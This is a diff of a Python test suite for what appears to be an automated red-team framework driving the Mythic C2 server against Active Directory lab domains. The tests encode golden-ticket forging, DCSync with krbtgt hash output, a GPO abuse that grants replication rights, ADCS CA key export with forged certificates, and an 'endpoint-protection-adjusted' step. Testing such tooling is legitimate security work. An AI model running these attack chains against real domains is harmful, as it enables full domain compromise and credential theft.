+    assert acquire_step["parameters"]["service"] == "cifs/kingslanding.sevenkingdoms.local"
+    proof_step = plan["execution_plan"]["steps"][-1]
+    assert proof_step["operation"] == "kerberos-context-service-proof"
+    assert proof_step["parameters"]["domain"] == "sevenkingdoms.local"
+    assert proof_step["parameters"]["resource"] == "\\\\kingslanding.sevenkingdoms.local\\C$"
 
 
 def test_cross_domain_forge_executor_skips_only_leading_preflight_not_current_tgt_import():
@@ -4388,7 +5390,7 @@ def test_cross_domain_forge_executor_skips_only_leading_preflight_not_current_tg
     # heuristic is position-agnostic and ALSO matches the cross-domain chain's core post-forge steps (current
     # TGT import, purge, post-import inventory), because their purposes mention the "current Kerberos context"
     # and the post-import list re-inventories it. Skipping the import collapses the cross-domain chain because
-    # Windows never gets the EA-capable TGT that allows native LDAP-ticket acquisition. Drive the REAL classifier
+    # Windows never gets the EA-capable TGT that allows native CIFS-ticket acquisition. Drive the REAL classifier
     # + skip predicate over the REAL build payload to lock the position-aware behavior in.
     mt = _make_tools()
 
@@ -4422,13 +5424,13 @@ def test_cross_domain_forge_executor_skips_only_leading_preflight_not_current_tg
 
     # Leading inventory + access-check are skipped (redundant with the separate preflight)…
     assert issued[0] == "execute_assembly"  # golden forge, not the leading klist/dir
-    # …but every core step after the forge runs — critically the current-session TGT import, native LDAP-ticket
-    # acquisition, and DCSync.
+    # …but every core step after the forge runs — critically the current-session TGT import, native CIFS-ticket
+    # acquisition, and current-callback service proof.
     assert "ticket_cache_add" in issued, f"current-session TGT import was dropped: {issued}"
-    assert "dcsync" in issued, f"parent DCSync was dropped: {issued}"
+    assert issued[-1] == "shell", f"current-callback service proof was dropped: {issued}"
+    assert "dcsync" not in issued
     assert issued.count("execute_assembly") == 1  # golden only; no Rubeus asktgs exchange
-    assert issued[-2] == "shell"  # native klist get ldap/<parent dc>
-    assert issued[-1] == "dcsync"
+    assert issued[-2] == "shell"  # native klist get cifs/<parent dc>
 
 
 def test_cross_domain_forge_issue_boundary_matches_current_cache_oracle():
@@ -4471,7 +5473,6 @@ def test_cross_domain_forge_issue_boundary_matches_current_cache_oracle():
         },
         {"child_dc": "dc01.child.root.local"},
     )))
-    mt._cross_domain_replication_rights.add("root.local")
     forged_ticket = "A" * 88
     outputs = iter([
         f"[*] base64(ticket.kirbi):\n{forged_ticket}",
@@ -4479,7 +5480,7 @@ def test_cross_domain_forge_issue_boundary_matches_current_cache_oracle():
         "Ticket successfully imported.",
         "Cached Tickets: (1)",
         "Cached Tickets: (2)",
-        "[DC] 'root.local'\nHash NTLM: 0123456789abcdef0123456789abcdef",
+        " Directory of \\\\dc01.root.local\\C$\n",
     ])
     calls = {}
 
@@ -4493,15 +5494,11 @@ def test_cross_domain_forge_issue_boundary_matches_current_cache_oracle():
         "ticket_cache_add",
         "ticket_cache_list",
         "shell",
-        "dcsync",
+        "shell",
     ]
     assert forged_ticket in calls["issued"][2]["parameters"]["base64ticket"]
-    assert calls["issued"][4]["parameters"] == "klist.exe get ldap/dc01.root.local"
-    assert calls["issued"][-1]["parameters"] == {
-        "domain": "root.local",
-        "user": "ROOT\\krbtgt",
-        "dc": "dc01.root.local",
-    }
+    assert calls["issued"][4]["parameters"] == "klist.exe get cifs/dc01.root.local"
+    assert calls["issued"][-1]["parameters"] == "dir \\\\dc01.root.local\\C$"
 
 
 def test_cross_domain_forge_recognizes_parent_dcsync_as_proof():
@@ -4613,6 +5610,72 @@ def test_direct_dcsync_capabilities_verify_only_final_secret_probe(capability_na
     )
     assert no_secret_probe["krbtgt_hash_present"] is False
     assert no_secret_verification.verdict != "achieved"
+
+
+def test_grant_directory_rights_executor_verifies_only_final_acl_read_probe():
+    mt = _make_tools()
+    action = capabilities.CapabilityAction(
+        name="grant-directory-rights",
+        target="domain=range.local;source=gpo-system-exec:srv02-policy",
+        preconditions=["system-exec:gpo:srv02-policy@range.local"],
+        effects=["ds-replication-rights:range.local"],
+        intent={"capability": "grant-directory-rights", "domain": "range.local"},
+    )
+    setup_cmd = {
+        "command": "execute_assembly",
+        "operation": "gpo-computer-task",
+        "expected_probe": "extract_directory_rights_probe",
+        "produces": ["artifact:gpo_immediate_task"],
+        "consumes": [],
+        "purpose": "schedule StandIn to grant DCSync rights through srv02-policy",
+    }
+    acl_cmd = {
+        "command": "execute_assembly",
+        "operation": "ldap-acl-read",
+        "expected_probe": "extract_directory_rights_probe",
+        "produces": [],
+        "consumes": ["event:group_policy_refresh"],
+        "purpose": "read target domain ACL for DS-Replication ACE verification",
+    }
+
+    setup_probe, setup_verification = mt._capability_executor_verify_output(
+        action,
+        {},
+        9,
+        "[+] Set object access rules\n    |_ Success, added dcsync privileges to object for RANGE\\user1",
+        setup_cmd,
+        capabilities,
+    )
+    assert setup_probe is None
+    assert setup_verification is None
+    assert mt._capability_executor_is_final_probe(setup_cmd) is False
+
+    acl_output = """
+[+] Identity --> RANGE\\user1
+    |_ Type       : Allow
+    |_ Permission : ExtendedRight
+    |_ Object     : DS-Replication-Get-Changes-All
+
+[+] Identity --> RANGE\\user1
+    |_ Type       : Allow
+    |_ Permission : ExtendedRight
+    |_ Object     : DS-Replication-Get-Changes
+"""
+    probe, verification = mt._capability_executor_verify_output(
+        action,
+        {},
+        9,
+        acl_output,
+        acl_cmd,
+        capabilities,
+    )
+
+    assert mt._capability_executor_is_final_probe(acl_cmd) is True
+    assert probe["get_changes"] is True
+    assert probe["get_changes_all"] is True
+    assert probe["ds_replication_rights"] is True
+    assert probe["callback_id"] == "9"
+    assert verification.verdict == "achieved"
 
 
 def test_cross_domain_current_tgt_import_grants_rights_and_precheck_honors_it(monkeypatch):
@@ -4744,6 +5807,49 @@ def test_execute_capability_ensure_kerberos_context_preflights_without_key_or_si
     assert result["issued"][0]["parameters"] == "klist"
     assert "kerberos-context:essos.local@callback:14" in result["achieved_effects"]
     assert result["recorded_effects"] == ["kerberos-context:essos.local@callback:14"]
+
+
+def test_current_context_preflight_rebinds_identical_klist_to_active_transaction():
+    mt = _make_tools()
+    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
+    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
+    events = []
+    mt.set_execution_observer(events.append)
+    action = capabilities.CapabilityAction(
+        name="ensure-kerberos-context",
+        target="domain=lab.local;callback=14",
+        intent={"capability": "ensure-kerberos-context", "domain": "lab.local", "callback_id": "14"},
+    )
+    outputs = iter(["No tickets in current context.", "Access is denied."] * 2)
+
+    with _split_issue(lambda: next(outputs), display_id=9908):
+        first = asyncio.run(mt._execute_capability_current_context_preflight(
+            action,
+            {"domain": "lab.local", "callback_id": "14", "proof_resource": r"\\dc01.lab.local\C$", "transaction_id": "tx-a"},
+            14,
+            5,
+            capabilities,
+        ))
+        second = asyncio.run(mt._execute_capability_current_context_preflight(
+            action,
+            {"domain": "lab.local", "callback_id": "14", "proof_resource": r"\\dc02.lab.local\C$", "transaction_id": "tx-b"},
+            14,
+            5,
+            capabilities,
+        ))
+
+    started = [event for event in events if event["status"] == "started"]
+    terminal = [event for event in events if event["status"] in {"completed", "error"}]
+    assert first["status"] == second["status"] == "not_achieved"
+    assert [(event["parameters"], event["transaction_id"]) for event in started] == [
+        ("klist", "tx-a"),
+        (r"dir \\dc01.lab.local\C$", "tx-a"),
+        ("klist", "tx-b"),
+        (r"dir \\dc02.lab.local\C$", "tx-b"),
+    ]
+    assert [event["event_id"] for event in started] == [event["event_id"] for event in terminal]
+    assert [event["terminal_status"] for event in terminal] == ["completed", "failed", "completed", "failed"]
+    assert mt._engagement_hops == []
 
 
 def test_execute_capability_failure_includes_trajectory_repair(monkeypatch, tmp_path):
@@ -5166,25 +6272,13 @@ def test_materialize_capability_inputs_stages_adcs_certificate_then_builder_uses
     ca_artifact = _write_test_ca_pfx(artifact_dir / "adcs_ca_test_ca01_lab.local.pfx", "CA Secret!")
     engagement_ledger.save({
         "engagement_id": "test-op",
-        "hops": [
-            {
-                "id": "capability:adcs-ca-private-key-export:target=ca01;target_domain=lab.local;callback=13",
-                "effect": "adcs-ca-private-key:ca01@lab.local",
-                "status": "achieved",
-                "satisfied_effects": ["adcs-ca-private-key:ca01@lab.local"],
-                "evidence": {
-                    "artifact_present": True,
-                    "verify_verdict": "achieved",
-                    "pfx_artifact_path": str(ca_artifact),
-                },
-            }
-        ],
+        "hops": [_ca_artifact_hop(ca_artifact)],
     }, "test-op")
     mt = _make_tools()
     mt._engagement_key = "test-op"
     calls = {}
 
-    async def fake_register_file(client, filename, contents):
+    async def fake_register_file(filename, contents):
         calls["registered_filename"] = filename
         calls["registered_contents"] = contents
         return "file-uuid-1"
@@ -5200,7 +6294,7 @@ def test_materialize_capability_inputs_stages_adcs_certificate_then_builder_uses
         }
         return "Uploaded forged PFX"
 
-    monkeypatch.setattr(mythic_tools.mythic, "register_file", fake_register_file)
+    monkeypatch.setattr(mt, "_register_file", fake_register_file)
     monkeypatch.setattr(mt, "upload_file_by_file_uuid", fake_upload)
 
     materialized = json.loads(asyncio.run(mt.materialize_capability_inputs(
@@ -5261,25 +6355,13 @@ def test_materialize_capability_inputs_compacts_merlin_paths_and_uses_registered
     ca_artifact = _write_test_ca_pfx(artifact_dir / "adcs_ca_test_ca01_lab.local.pfx", "CA Secret!")
     engagement_ledger.save({
         "engagement_id": "test-op",
-        "hops": [
-            {
-                "id": "capability:adcs-ca-private-key-export:target=ca01;target_domain=lab.local;callback=13",
-                "effect": "adcs-ca-private-key:ca01@lab.local",
-                "status": "achieved",
-                "satisfied_effects": ["adcs-ca-private-key:ca01@lab.local"],
-                "evidence": {
-                    "artifact_present": True,
-                    "verify_verdict": "achieved",
-                    "pfx_artifact_path": str(ca_artifact),
-                },
-            }
-        ],
+        "hops": [_ca_artifact_hop(ca_artifact)],
     }, "test-op")
     mt = _make_tools()
     mt._engagement_key = "test-op"
     calls = {}
 
-    async def fake_register_file(client, filename, contents):
+    async def fake_register_file(filename, contents):
         return "ca-file-uuid"
 
     async def fake_upload(command, parameters, file_uuid, callback_display_id, token_id=None, timeout=None):
@@ -5292,7 +6374,7 @@ def test_materialize_capability_inputs_compacts_merlin_paths_and_uses_registered
         }
         return "Uploaded CA PFX"
 
-    monkeypatch.setattr(mythic_tools.mythic, "register_file", fake_register_file)
+    monkeypatch.setattr(mt, "_register_file", fake_register_file)
     monkeypatch.setattr(mt, "upload_file_by_file_uuid", fake_upload)
 
     materialized = json.loads(asyncio.run(mt.materialize_capability_inputs(
@@ -5335,31 +6417,77 @@ def test_materialize_capability_inputs_compacts_merlin_paths_and_uses_registered
     assert len(forge["parameters"]["arguments"].encode("utf-8")) <= 255
 
 
+def test_materialize_capability_inputs_upload_emits_active_transaction_lineage(monkeypatch):
+    state_dir = Path(os.environ["SAGE_ENGAGEMENT_STATE_DIR"])
+    ca_artifact = _write_test_ca_pfx(state_dir / "artifacts" / "adcs_ca_test_ca01_lab.local.pfx", "CA Secret!")
+    engagement_ledger.save({"engagement_id": "test-op", "hops": [_ca_artifact_hop(ca_artifact)]}, "test-op")
+    mt = _make_tools()
+    mt._engagement_key = "test-op"
+    events = []
+    mt.set_execution_observer(events.append)
+
+    async def fake_register_file(filename, contents):
+        return "file-uuid-1"
+
+    async def fake_get_file_metadata(file_uuid):
+        return {
+            "agent_file_id": file_uuid,
+            "filename_utf8": ca_artifact.name,
+            "deleted": False,
+            "complete": True,
+            "chunks_received": 1,
+            "total_chunks": 1,
+        }
+
+    monkeypatch.setattr(mt, "_register_file", fake_register_file)
+    monkeypatch.setattr(mt, "_get_file_metadata", fake_get_file_metadata)
+    token = mythic_tools._task_visibility_context.set({
+        "transaction_id": "tx-adcs",
+        "policy_decision": {"decision_id": "decision-adcs"},
+    })
+    try:
+        with _split_issue("Uploaded forged PFX", display_id=9001):
+            materialized = json.loads(asyncio.run(mt.materialize_capability_inputs(
+                {
+                    "capability": "adcs-certificate-auth",
+                    "domain": "lab.local",
+                    "account": "administrator",
+                    "ca_host": "ca01",
+                    "callback_id": "13",
+                },
+                {"proof_host": "dc01.lab.local", "ca_pfx_password": "CA Secret!"},
+            )))
+    finally:
+        mythic_tools._task_visibility_context.reset(token)
+
+    assert materialized["ok"] is True
+    assert materialized["action"]["intent"]["transaction_id"] == "tx-adcs"
+    assert [event["transaction_id"] for event in events] == ["tx-adcs", "tx-adcs"]
+    assert [event["capability"] for event in events] == ["adcs-certificate-auth", "adcs-certificate-auth"]
+    assert [event["callback_id"] for event in events] == [13, 13]
+    assert events[0]["event_id"] == events[1]["event_id"] == "mythic-task:13:9001"
+    assert events[1]["terminal_status"] == "completed"
+    assert events[0]["parameters"] == {
+        "File": "file-uuid-1",
+        "Path": r"C:\Windows\Temp\sage_ca_signing_administrator_lab_local_13.pfx",
+    }
+    assert events[1]["output"] == "Uploaded forged PFX"
+    assert mt._engagement_hops == []
+
+
 def test_materialize_capability_inputs_fails_closed_when_adcs_upload_never_issues_task(monkeypatch):
     state_dir = Path(os.environ["SAGE_ENGAGEMENT_STATE_DIR"])
     artifact_dir = state_dir / "artifacts"
     ca_artifact = _write_test_ca_pfx(artifact_dir / "adcs_ca_test_ca01_lab.local.pfx", "CA Secret!")
     engagement_ledger.save({
         "engagement_id": "test-op",
-        "hops": [
-            {
-                "id": "capability:adcs-ca-private-key-export:target=ca01;target_domain=lab.local;callback=13",
-                "effect": "adcs-ca-private-key:ca01@lab.local",
-                "status": "achieved",
-                "satisfied_effects": ["adcs-ca-private-key:ca01@lab.local"],
-                "evidence": {
-                    "artifact_present": True,
-                    "verify_verdict": "achieved",
-                    "pfx_artifact_path": str(ca_artifact),
-                },
-            }
-        ],
+        "hops": [_ca_artifact_hop(ca_artifact)],
     }, "test-op")
     mt = _make_tools()
     mt._engagement_key = "test-op"
     mt._last_issued_task_display_id = 8999
 
-    async def fake_register_file(client, filename, contents):
+    async def fake_register_file(filename, contents):
         return "file-uuid-1"
 
     async def fake_upload(command, parameters, file_uuid, callback_display_id, token_id=None, timeout=None):
@@ -5368,7 +6496,7 @@ def test_materialize_capability_inputs_fails_closed_when_adcs_upload_never_issue
             "selectable DISPLAY STRING, NOT a bare UUID."
         )
 
-    monkeypatch.setattr(mythic_tools.mythic, "register_file", fake_register_file)
+    monkeypatch.setattr(mt, "_register_file", fake_register_file)
     monkeypatch.setattr(mt, "upload_file_by_file_uuid", fake_upload)
 
     materialized = json.loads(asyncio.run(mt.materialize_capability_inputs(
@@ -5421,26 +6549,14 @@ def test_materialize_capability_inputs_embeds_resolved_administrator_sid(monkeyp
     ca_artifact = _write_test_ca_pfx(artifact_dir / "adcs_ca_test_ca01_lab.local.pfx")
     engagement_ledger.save({
         "engagement_id": "test-op",
-        "hops": [
-            {
-                "id": "capability:adcs-ca-private-key-export:target=ca01;target_domain=lab.local;callback=13",
-                "effect": "adcs-ca-private-key:ca01@lab.local",
-                "status": "achieved",
-                "satisfied_effects": ["adcs-ca-private-key:ca01@lab.local"],
-                "evidence": {
-                    "artifact_present": True,
-                    "verify_verdict": "achieved",
-                    "pfx_artifact_path": str(ca_artifact),
-                },
-            }
-        ],
+        "hops": [_ca_artifact_hop(ca_artifact)],
     }, "test-op")
     mt = _make_tools()
     mt._engagement_key = "test-op"
     mt._resolve_domain_sid = lambda domain: asyncio.sleep(0, result="S-1-5-21-111-222-333")
     calls = {}
 
-    async def fake_register_file(client, filename, contents):
+    async def fake_register_file(filename, contents):
         calls["registered_contents"] = contents
         return "file-uuid-1"
 
@@ -5448,7 +6564,7 @@ def test_materialize_capability_inputs_embeds_resolved_administrator_sid(monkeyp
         mt._last_issued_task_display_id = 9001
         return "Uploaded forged PFX"
 
-    monkeypatch.setattr(mythic_tools.mythic, "register_file", fake_register_file)
+    monkeypatch.setattr(mt, "_register_file", fake_register_file)
     monkeypatch.setattr(mt, "upload_file_by_file_uuid", fake_upload)
 
     materialized = json.loads(asyncio.run(mt.materialize_capability_inputs(
@@ -5503,6 +6619,105 @@ def test_execute_capability_adcs_certificate_auth_requires_verified_ca_key_befor
         "adcs-enrolled-certificate:administrator@lab.local",
     ]
     assert calls["issue"] == 0
+
+
+@pytest.mark.parametrize(("ca_host", "missing"), [("ca01.lab.local", False), ("ca01.other.local", True), ("ca01.evil-lab.local", True), ("ca010.lab.local", True)])
+def test_adcs_ca_host_boundary_matches_only_exact_target_domain(ca_host, missing):
+    mt = _make_tools()
+    action = capabilities.CapabilityAction(
+        name="adcs-certificate-auth",
+        target=f"domain=lab.local;account=administrator;ca_host={ca_host};callback=13",
+        intent={"capability": "adcs-certificate-auth", "domain": "lab.local", "account": "administrator"},
+    )
+    failure = mt._capability_artifact_scoped_precondition_failure(
+        action, {"ca_host": ca_host}, {"adcs-ca-private-key:ca01@lab.local"}
+    )
+    assert (failure == {}) is (not missing)
+    assert ("ca_host" in failure.get("missing", [])) is (missing and ca_host != "ca010.lab.local")
+    assert ("adcs-ca-private-key:ca010@lab.local" in failure.get("missing", [])) is (ca_host == "ca010.lab.local")
+    assert ("adcs-ca-private-key:ca01@lab.local" in failure.get("missing", [])) is False
+
+
+def test_public_capability_summaries_redact_durable_ca_password(tmp_path):
+    secret = artifact_secrets.derive_password(tmp_path, engagement_id="test-op", purpose=artifact_secrets.ADCS_CA_EXPORT_PFX_PURPOSE, canonical_host="ca01", domain="lab.local")
+    mt = _make_tools()
+    public = {"safe": mt._safe_capability_runtime_context({"ca_pfx_password": secret, "proof_host": "dc01.lab.local"}), "summary": mt._capability_executor_materialized_summary({"ok": True, "capability": "adcs-certificate-auth", "inputs": {"ca_pfx_password": secret}})}
+    assert secret not in json.dumps(public)
+    assert next((tmp_path / "secrets").glob("artifact_master_*.key")).read_bytes().hex() not in json.dumps(public)
+    issued = mt._capability_executor_public_issued([mt._capability_executor_command_item({}, "powerpick", {"commands": f"$pfxSecret='{secret}''x'; Write-Output $pfxSecret"}, 13, 1, "ok")])
+    assert secret not in json.dumps(issued)
+
+
+def test_public_executor_summary_redacts_encoded_adcs_commands_for_current_adapters():
+    mt = _make_tools()
+    secret = "SagePfx-v1-synthetic-secret"
+    action = capabilities.CapabilityAction(
+        name="adcs-ca-private-key-export",
+        target="target=ca01;target_domain=lab.local;callback=8",
+        preconditions=["remote-exec:ca01@lab.local", "local-admin:ca01@lab.local", "live-callback:8"],
+        effects=["adcs-ca-private-key:ca01@lab.local", "adcs-ca:ca01@lab.local"],
+        intent={
+            "capability": "adcs-ca-private-key-export",
+            "target_host": "ca01",
+            "target_domain": "lab.local",
+            "callback_id": "8",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "password": "Correct Horse Battery Staple!",
+        "pfx_password": secret,
+    })
+    apollo_plan = mythic_capability_adapter.build_mythic_capability_commands(execution_plan, mythic_capability_adapter.APOLLO_MYTHIC_ADAPTER)
+    merlin_plan = mythic_capability_adapter.build_mythic_capability_commands(execution_plan, mythic_capability_adapter.MERLIN_MYTHIC_ADAPTER)
+    powerpick_plan = mythic_capability_adapter.build_mythic_capability_commands(execution_plan, {
+        "adcs_ca_export_command": "powerpick",
+        "adcs_ca_export_use_current_context": True,
+    })
+    apollo, merlin, powerpick = apollo_plan.commands[1], merlin_plan.commands[1], powerpick_plan.commands[0]
+    encoded = [
+        apollo.parameters["command"].split("-EncodedCommand ", 1)[1],
+        merlin.parameters["arguments"].rsplit(" ", 1)[1],
+    ]
+    assert all(secret in base64.b64decode(value).decode("utf-16le") for value in encoded)
+    issued = [
+        mt._capability_executor_command_item(asdict(apollo), apollo.command, apollo.parameters, 13, 1, f"raw output {secret}"),
+        mt._capability_executor_command_item(asdict(merlin), merlin.command, merlin.parameters, 13, 2, "ok"),
+        mt._capability_executor_command_item(asdict(powerpick), powerpick.command, powerpick.parameters, 13, 3, "ok"),
+        mt._capability_executor_command_item({}, "shell", {"metadata": {"history": [("near_match", "SagePfx-v2-benign"), ("encoded", f"powershell.exe -EncodedCommand {encoded[0]}")], "short_blob": "YWJjZA==", "credential_text": secret}}, 13, 4, "ok"),
+    ]
+
+    public = mt._capability_executor_public_issued(issued)
+    rendered = json.dumps(public, sort_keys=True)
+    assert all(value not in rendered for value in encoded)
+    assert secret not in rendered
+    assert "<base64_blob>" in rendered
+    assert "<secret>" in rendered
+    assert public[2]["parameters"].count("<secret>") >= 1
+    assert public[3]["parameters"]["metadata"]["history"][0][1] == "SagePfx-v2-benign"
+    assert public[3]["parameters"]["metadata"]["short_blob"] == "YWJjZA=="
+    assert public[3]["parameters"]["metadata"]["credential_text"] == "<secret>"
+    assert all("_output" not in row for row in public)
+    assert issued[0]["_output"] == f"raw output {secret}"
+
+
+def test_mythic_execution_observer_preserves_raw_adcs_encoded_parameters_and_output():
+    mt = _make_tools()
+    events = []
+    mt.set_execution_observer(events.append)
+    secret = "SagePfx-v1-synthetic-secret"
+    script = "$pfxSecret='" + secret + "';" + ("Write-Output $pfxSecret;" * 8)
+    encoded = base64.b64encode(script.encode("utf-16le")).decode("ascii")
+    parameters = {"command": f"powershell.exe -EncodedCommand {encoded}"}
+    output = f"raw output {secret}"
+
+    with _split_issue(output, display_id=4242):
+        result = asyncio.run(mt.issue_task_and_waitfor_task_output("whoami", parameters, 11))
+
+    assert result == output
+    assert events[0]["parameters"] == parameters
+    assert encoded in events[0]["parameters"]["command"]
+    assert events[1]["output"] == output
+    assert secret in events[1]["output"]
 
 
 def test_execute_capability_adcs_certificate_auth_materializes_and_records(monkeypatch):
@@ -5649,7 +6864,8 @@ def test_execute_capability_adcs_certificate_auth_falls_back_to_schannel_for_com
                 "target_domain": "lab.local",
                 "account": "administrator",
                 "callback_id": "13",
-                "certificate_already_forged": True,
+                "ca_pfx_path": r"C:\Windows\Temp\sage_ca_signing_administrator_lab_local_13.pfx",
+                "ca_pfx_password": "SagePfx!administrator_lab_local_13",
                 "forged_pfx_path": r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx",
                 "forged_pfx_password": "SageCert!administrator_lab_local_13",
                 "proof_host": "dc01.lab.local",
@@ -5659,6 +6875,7 @@ def test_execute_capability_adcs_certificate_auth_falls_back_to_schannel_for_com
         }, sort_keys=True)
 
     monkeypatch.setattr(mt, "materialize_capability_inputs", fake_materialize)
+    forge_output = "Certify\nSaved forged certificate to 'C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_13.pfx'.\n"
     schannel_output = "\n".join([
         "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13",
         "CERT_AUTH_METHOD=schannel-ldap",
@@ -5669,15 +6886,23 @@ def test_execute_capability_adcs_certificate_auth_falls_back_to_schannel_for_com
         "CERT_AUTH_MEMBER_OF=CN=Domain Admins,CN=Users,DC=lab,DC=local",
         "CERT_AUTH_STATUS=OK",
     ])
-    outputs = iter([
-        "No tickets in current context.",
-        "Access is denied.",
-        pkinit_failure,
-        schannel_output,
-    ])
     calls = {"issue": 0}
 
-    with _split_issue(lambda: next(outputs), calls, display_id=9494):
+    def next_output():
+        issued = calls["issued"][-1]
+        command = issued["command_name"]
+        parameters = issued["parameters"]
+        if command == "shell":
+            return "No tickets in current context." if calls["issue"] == 1 else "Access is denied."
+        if command == "execute_assembly" and "forge --ca-cert" in parameters["assembly_arguments"]:
+            return forge_output
+        if command == "execute_assembly" and "asktgt " in parameters["assembly_arguments"]:
+            return pkinit_failure
+        if command == "powerpick":
+            return schannel_output
+        raise AssertionError(f"unexpected command during Schannel fallback: {command}")
+
+    with _split_issue(next_output, calls, display_id=9494):
         result = json.loads(asyncio.run(mt.execute_capability(
             {
                 "capability": "adcs-certificate-auth",
@@ -5692,7 +6917,13 @@ def test_execute_capability_adcs_certificate_auth_falls_back_to_schannel_for_com
     assert result["ok"] is True, result
     assert result["fallback"] == "schannel-ldap"
     assert result["stopped_after"] == "schannel_ldap_fallback_verified_proof"
-    assert calls["issue"] == 4
+    assert calls["issue"] == 5
+    assert sum(
+        1
+        for item in calls["issued"]
+        if item["command_name"] == "execute_assembly"
+        and "forge --ca-cert" in item["parameters"]["assembly_arguments"]
+    ) == 1
     assert result["issued"][-1]["command"] == "powerpick"
     assert result["issued"][-1]["fallback"] == "schannel-ldap"
     assert "$server='dc01.lab.local'" in result["issued"][-1]["parameters"]
@@ -6000,6 +7231,137 @@ def test_capability_executor_records_transient_failure_as_retryable():
     assert mt._capability_failed_effects() == set()
 
 
+def test_execute_capability_eval_injected_blocker_records_terminal_gpo_failure(monkeypatch):
+    mt = _make_tools()
+    monkeypatch.setenv(
+        "SAGE_EVAL_INJECT_CAPABILITY_BLOCKER_JSON",
+        json.dumps({
+            "capability": "gpo-controlled-system-exec",
+            "target_contains": "gpo=srv02-policy;domain=range.local",
+            "reason": "endpoint protection blocked the staged GPO payload on srv02",
+            "probe": {
+                "defender_blocked": True,
+                "target_domain": "range.local",
+                "target_host": "srv02",
+            },
+        }),
+    )
+    action = capabilities.CapabilityAction(
+        name="gpo-controlled-system-exec",
+        target="gpo=srv02-policy;domain=range.local",
+        preconditions=[],
+        effects=["system-exec:gpo:srv02-policy@range.local"],
+        intent={
+            "capability": "gpo-controlled-system-exec",
+            "gpo": "srv02-policy",
+            "domain": "range.local",
+        },
+    )
+
+    result = json.loads(asyncio.run(mt.execute_capability(action, {"callback_id": "13"})))
+
+    assert result["ok"] is False
+    assert result["verdict"] == "blocked"
+    assert result["eval_injected_blocker"] is True
+    assert result["issued"] == []
+    assert result["recorded_failed_effects"] == ["system-exec:gpo:srv02-policy@range.local"]
+    failed = mt._engagement_hops[-1]
+    assert failed.status == "blocked"
+    assert failed.evidence["defender_blocked"] is True
+    assert failed.evidence["terminal_failure"] is True
+    assert failed.evidence["failure_class"] == "genuine"
+    assert failed.evidence["verify_reason"] == "endpoint protection blocked the staged GPO payload on srv02"
+
+
+def test_execute_capability_eval_injected_transient_blocker_releases_after_repair_effect(monkeypatch):
+    mt = _make_tools()
+    mt._engagement_hops = [
+        _proof_hop("local-admin:ca01@range.local", 55),
+        _proof_hop("remote-exec:ca01@range.local", 56),
+    ]
+    monkeypatch.setenv(
+        "SAGE_EVAL_INJECT_CAPABILITY_BLOCKER_JSON",
+        json.dumps({
+            "capability": "adcs-ca-private-key-export",
+            "target_contains": "target=ca01;target_domain=range.local",
+            "reason": "endpoint protection blocked CA export tooling on ca01",
+            "failure_class": "transient",
+            "skip_if_achieved_effect": "endpoint-protection-adjusted:ca01@range.local",
+            "probe": {
+                "tool_execution_failed": True,
+                "defender_blocked": True,
+                "target_domain": "range.local",
+                "target_host": "ca01",
+            },
+        }),
+    )
+    action = capabilities.CapabilityAction(
+        name="adcs-ca-private-key-export",
+        target="target=ca01;target_domain=range.local",
+        preconditions=[],
+        effects=["adcs-ca-private-key:ca01@range.local"],
+        intent={"capability": "adcs-ca-private-key-export"},
+    )
+
+    result = json.loads(asyncio.run(mt.execute_capability(action, {"callback_id": "13"})))
+
+    assert result["ok"] is False
+    assert result["verdict"] == "blocked"
+    assert result["failure_class"] == "transient"
+    failed = mt._engagement_hops[-1]
+    assert failed.evidence["terminal_failure"] is False
+    assert failed.evidence["retryable_failure"] is True
+    mt._engagement_hops.append(_proof_hop("endpoint-protection-adjusted:ca01@range.local", 57))
+    assert mt._capability_executor_injected_blocker(action, {"callback_id": "13"}, "13", capabilities) is None
+
+
+def test_execute_capability_eval_injected_blocker_can_record_declared_action_effect(monkeypatch):
+    mt = _make_tools()
+    mt._engagement_hops = [_proof_hop("adcs-ca-private-key:ca01@lab.local", 58)]
+    monkeypatch.setenv(
+        "SAGE_EVAL_INJECT_CAPABILITY_BLOCKER_JSON",
+        json.dumps({
+            "capability": "adcs-certificate-auth",
+            "target_contains": "domain=lab.local;account=administrator;ca_host=ca01",
+            "reason": "certificate authentication failed after verified CA export on ca01",
+            "failure_class": "genuine",
+            "record_failed_effect": "certificate-auth:administrator@lab.local",
+            "probe": {
+                "pkinit_failed": True,
+                "target_domain": "lab.local",
+                "target_host": "ca01",
+                "account": "administrator",
+            },
+        }),
+    )
+    action = capabilities.CapabilityAction(
+        name="adcs-certificate-auth",
+        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
+        preconditions=[],
+        effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
+        intent={
+            "capability": "adcs-certificate-auth",
+            "domain": "lab.local",
+            "account": "administrator",
+            "ca_host": "ca01",
+            "callback_id": "13",
+        },
+    )
+
+    result = json.loads(asyncio.run(mt.execute_capability(action, {"callback_id": "13"})))
+
+    assert result["ok"] is False
+    assert result["verdict"] == "blocked"
+    assert result["record_failed_effect"] == "certificate-auth:administrator@lab.local"
+    failed = mt._engagement_hops[-1]
+    assert failed.status == "blocked"
+    assert failed.effect == "certificate-auth:administrator@lab.local"
+    assert failed.satisfied_effects == [
+        "certificate-auth:administrator@lab.local",
+        "da:lab.local",
+    ]
+
+
 def test_execute_capability_output_preview_redacts_ticket_store_json():
     mt = _make_tools()
     ticket = base64.b64encode(b"C" * 220).decode()
@@ -6231,6 +7593,114 @@ def test_ensure_context_service_proof_retry_key_advances_after_ticket_import():
     }
 
 
+def test_ensure_context_service_proof_retry_key_advances_after_native_refresh():
+    mt = _make_tools()
+
+    async def no_schema(command, callback_display_id):
+        return []
+
+    async def no_validation(command, parameters, callback_display_id):
+        return None
+
+    mt._fetch_command_schema = no_schema
+    mt._validate_command_parameters = no_validation
+    proof_params = _seed_ensure_context_service_proof(mt)
+    purge_params = {"executable": "klist.exe", "arguments": "purge"}
+    acquire_params = {"executable": "klist.exe", "arguments": "get cifs/dc01.lab.local"}
+    mt._deterministic_capability_command_contexts[
+        mythic_tools._capability_command_key("run", purge_params)
+    ] = {
+        "capability": "ensure-kerberos-context",
+        "operation": "kerberos-ticket-purge",
+        "expected_probe": "extract_ticket_cache_probe",
+        "produces": ["kerberos_current_tickets_purged"],
